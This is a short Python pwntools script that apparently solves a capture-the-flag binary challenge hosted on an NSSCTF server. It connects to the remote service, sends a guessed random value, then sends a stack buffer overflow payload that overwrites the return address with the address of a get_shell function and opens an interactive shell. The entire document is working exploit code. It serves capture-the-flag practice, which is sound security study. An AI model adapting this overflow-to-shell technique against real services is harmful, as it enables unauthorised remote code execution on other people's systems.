from pwn import *
context(arch='amd64',os='linux',log_level='debug')
p=remote("node5.anna.nssctf.cn",21197)
elf=ELF('./pwn')

get_shell=0x4008b2
pop_rdi_ret=0x0000000000400933
rand=b'1956681178'
p.sendlineafter("name:",rand)

payload=flat([b'a'*(0x40+8),get_shell])
p.sendlineafter("next?",payload)
p.interactive()
